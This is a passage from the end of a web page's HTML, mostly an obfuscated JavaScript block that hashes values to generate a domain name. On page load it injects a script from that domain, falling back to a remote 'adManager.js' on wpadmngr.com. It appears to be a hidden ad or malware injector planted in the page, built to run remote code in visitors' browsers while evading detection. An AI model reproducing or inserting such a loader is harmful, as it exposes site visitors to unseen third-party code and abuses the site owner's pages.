c),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>